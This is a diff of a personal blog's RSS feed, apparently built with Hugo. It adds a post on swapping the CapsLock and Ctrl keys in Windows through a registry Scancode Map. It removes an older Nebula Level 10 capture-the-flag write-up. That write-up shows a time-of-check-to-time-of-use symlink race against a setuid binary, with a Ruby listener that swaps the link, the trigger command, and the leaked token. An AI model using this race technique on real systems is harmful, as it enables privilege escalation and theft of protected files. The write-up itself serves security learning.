@@ -6,8 +6,48 @@
     <description>Recent content on Zea&#39;s</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Thu, 27 Aug 2015 18:31:48 +0800</lastBuildDate>
+    <lastBuildDate>Mon, 14 Sep 2015 16:51:18 +0800</lastBuildDate>
     <atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>[转]windows下交换CapsLock和Ctrl键</title>
+      <link>/post/2015-09-14-win7-exchange-capslock-and-ctrl/</link>
+      <pubDate>Mon, 14 Sep 2015 16:51:18 +0800</pubDate>
+      
+      <guid>/post/2015-09-14-win7-exchange-capslock-and-ctrl/</guid>
+      <description>&lt;p&gt;原文地址：&lt;a href=&#34;http://www.kodiva.com/post/swapping-caps-lock-and-control-keys&#34;&gt;http://www.kodiva.com/post/swapping-caps-lock-and-control-keys&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;NOTE：原文描述该方法在 Windows XP，Windows Vista，Windows 7下可用，本人测试在Win10下亦可用&lt;/p&gt;
+
+&lt;p&gt;In our opinion this is the best way to swap the control and caps lock keys in Windows because you don&amp;rsquo;t have to rely on any external program and the registry edit works 100% perfectly (for the paranoid).&lt;/p&gt;
+
+&lt;p&gt;Why should one bother changing the caps lock and control keys, what&amp;rsquo;s wrong with the control key where it is? After extensive testing, our conclusion is that - if you use the control key a lot (like in Emacs or Vim), then you should definitely swap the control and caps lock keys as it&amp;rsquo;s extremely ergo-dynamic to have the control key in the home row.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Click Start -&amp;gt; Run&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Type: &lt;em&gt;regedit&lt;/em&gt;, and click OK&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Go to: &lt;em&gt;HKEY_LOCAL_MACHINE&lt;/em&gt; -&amp;gt; &lt;em&gt;System&lt;/em&gt; -&amp;gt; &lt;em&gt;CurrentControlSet&lt;/em&gt; -&amp;gt; &lt;em&gt;Control&lt;/em&gt; -&amp;gt; &lt;em&gt;KeyBoard Layout&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Note: &lt;em&gt;KeyBoard Layout&lt;/em&gt;, and NOT &lt;em&gt;KeyBoard Layouts&lt;/em&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Right-click: Keyboard Layout, and select New -&amp;gt; Binary value&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Rename: New Value #1 -&amp;gt; Scancode Map&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Right click: Scancode Map -&amp;gt; Modify&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0000  00 00 00 00 00 00 00 00       
+0008  03 00 00 00 1d 00 3a 00
+0010  3a 00 1d 00 00 00 00 00
+0018
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Close regedit and restart your computer&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
     
     <item>
       <title>Linux下VIM编码设置——解决中文乱码问题</title>
@@ -1817,145 +1857,6 @@ uid=1012(level11) gid=1012(level11) groups=1012(level11)
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;No privilege dropped )=&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Exploit Exercises - Nebula Level 10</title>
-      <link>/post/2014-01-25-nebula-level10/</link>
-      <pubDate>Sat, 25 Jan 2014 12:40:53 +0800</pubDate>
-      
-      <guid>/post/2014-01-25-nebula-level10/</guid>
-      <description>
-
-&lt;h3 id=&#34;about:14691d9c48d881479fa7a5e0fa8d86be&#34;&gt;About&lt;/h3&gt;
-
-&lt;p&gt;The setuid binary at &lt;em&gt;/home/flag10/flag10&lt;/em&gt; binary will upload any file given, as long as it meets the requirements of the &lt;em&gt;access()&lt;/em&gt; system call.&lt;/p&gt;
-
-&lt;p&gt;To do this level, log in as the &lt;em&gt;level10&lt;/em&gt; account with the password &lt;em&gt;level10&lt;/em&gt;. Files for this level can be found in /home/flag10.&lt;/p&gt;
-
-&lt;h3 id=&#34;source-code:14691d9c48d881479fa7a5e0fa8d86be&#34;&gt;Source Code&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;sys/types.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;fcntl.h&amp;gt;
-#include &amp;lt;errno.h&amp;gt;
-#include &amp;lt;sys/socket.h&amp;gt;
-#include &amp;lt;netinet/in.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-
-int main(int argc, char **argv)
-{
-  char *file;
-  char *host;
-
-  if(argc &amp;lt; 3) {
-    printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
-    exit(1);
-  }
-
-  file = argv[1];
-  host = argv[2];
-
-  if(access(argv[1], R_OK) == 0) {
-    int fd;
-    int ffd;
-    int rc;
-    struct sockaddr_in sin;
-    char buffer[4096];
-  	
-    printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);
-  	
-    fd = socket(AF_INET, SOCK_STREAM, 0);
-  	
-    memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
-    sin.sin_family = AF_INET;
-    sin.sin_addr.s_addr = inet_addr(host);
-    sin.sin_port = htons(18211);
-  	
-    if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
-      printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
-      exit(EXIT_FAILURE);
-    }
-  	
-#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
-    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
-      printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
-      exit(EXIT_FAILURE);
-    }
-#undef HITHERE
-  
-    printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);
-  	
-    ffd = open(file, O_RDONLY);
-    if(ffd == -1) {
-      printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
-      exit(EXIT_FAILURE);
-    }
-  	
-    rc = read(ffd, buffer, sizeof(buffer));
-    if(rc == -1) {
-      printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
-      exit(EXIT_FAILURE);
-    }
-  	
-    write(fd, buffer, rc);
-  	
-    printf(&amp;quot;wrote file!\n&amp;quot;);
-  } else {
-    printf(&amp;quot;You don&#39;t have access to %s\n&amp;quot;, file);
-  }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;!-- more --&gt;
-
-&lt;p&gt;There at two files in the directory /home/flag10, &lt;em&gt;flag10&lt;/em&gt; and &lt;em&gt;token&lt;/em&gt;. The source code of executable &lt;em&gt;flag10&lt;/em&gt; in shown above, and &lt;em&gt;token&lt;/em&gt; contains the password of user &lt;em&gt;flag10&lt;/em&gt;. The goal is to read the content of &lt;em&gt;token&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;The attack comes from a common bug called &lt;a href=&#34;http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use&#34;&gt;Time of check to time of use&lt;/a&gt;, the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like:&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;pass &lt;em&gt;/home/level10/token&lt;/em&gt; whick links to a real user(&lt;em&gt;level10&lt;/em&gt;) readable file &lt;em&gt;/home/level10/test&lt;/em&gt; to the program as &lt;code&gt;argv[1]&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;em&gt;/home/flag10/flag10&lt;/em&gt; checks whether this file is accessable at line 24(with the result true)&lt;/li&gt;
-&lt;li&gt;modify the file to link to &lt;em&gt;/home/flag10/token&lt;/em&gt; when &lt;em&gt;/home/flag10/flag10&lt;/em&gt; is executing code between line 24 and line 54&lt;/li&gt;
-&lt;li&gt;when &lt;em&gt;/home/flag10/flag10&lt;/em&gt; reads the file at line 54, it reads &lt;em&gt;/home/flag10/token&lt;/em&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the &lt;em&gt;flag10&lt;/em&gt; program will send a banner before actually read the file(line 46), this leaves me some time to make some change!&lt;/p&gt;
-
-&lt;p&gt;Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file &lt;em&gt;/home/level10/token&lt;/em&gt; immediately after the server accepts a connection from the client, I wrote this server code in Ruby:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;socket&#39;
-
-server = TCPServer.new(18211)
-loop {
-    client = server.accept
-    `rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`
-    while msg = client.gets
-        puts &amp;quot;RECV: #{msg}&amp;quot;
-    end
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;After the server was started, I triggered the vulnerability with the following command&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;$ /home/flag10/flag10 ~/token 127.0.0.1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Note that the symbolic file &lt;em&gt;~/token&lt;/em&gt; must exist and point to a file that is readable by user &lt;em&gt;level10&lt;/em&gt; before the program &lt;em&gt;flag10&lt;/em&gt; is executed.&lt;/p&gt;
-
-&lt;p&gt;The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level10@nebula:~$ ruby serv.rb 
-RECV: .oO Oo.
-RECV: hello world
-
-level10@nebula:~$ ruby serv.rb 
-RECV: .oO Oo.
-RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
-&lt;/code&gt;&lt;/pre&gt;
 </description>
     </item>
     
